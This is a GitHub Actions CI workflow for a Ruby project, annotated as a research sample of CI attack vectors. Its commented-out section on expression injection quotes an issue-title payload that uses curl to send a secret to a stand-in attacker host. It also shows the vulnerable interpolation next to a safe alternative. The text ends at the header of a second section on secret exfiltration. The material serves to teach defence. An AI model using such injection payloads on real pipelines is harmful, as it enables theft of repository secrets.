name: "CI Build and Test"

# Trigger on common events - appears as a normal CI workflow
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  # Research note: Triggering on pull_request_target is especially dangerous
  # because it runs with the BASE branch's secrets, not the PR branch.
  # This is Attack Vector #1 below.
  # pull_request_target:
  #   types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    # Research note: Self-hosted runners are high-value targets because they
    # often have access to internal networks and persistent credentials.
    # runs-on: self-hosted

    steps:
      # =====================================================================
      # LEGITIMATE STEPS - These are normal CI operations
      # =====================================================================
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Ruby
        uses: ruby/setup-ruby@v1
        with:
          ruby-version: '3.3'
          bundler-cache: true

      - name: Run tests
        run: bundle exec rspec

      # =====================================================================
      # ATTACK VECTOR 1: Script Injection (COMMENTED OUT)
      # =====================================================================
      # This technique exploits GitHub Actions expression injection.
      # If an issue title contains: "; curl https://evil.com/steal?t=$SECRET
      # the entire command will be executed in the runner shell.
      #
      # - name: "Process issue title"
      #   run: |
      #     echo "Processing: ${{ github.event.issue.title }}"
      #     # The above is vulnerable to injection because the title
      #     # is interpolated directly into the shell command.
      #     # Safe alternative: use an environment variable
      #     # env:
      #     #   TITLE: ${{ github.event.issue.title }}
      #     # run: echo "Processing: $TITLE"

      # =====================================================================
      # ATTACK VECTOR 2: Secret Exfiltration (COMMENTED OUT)
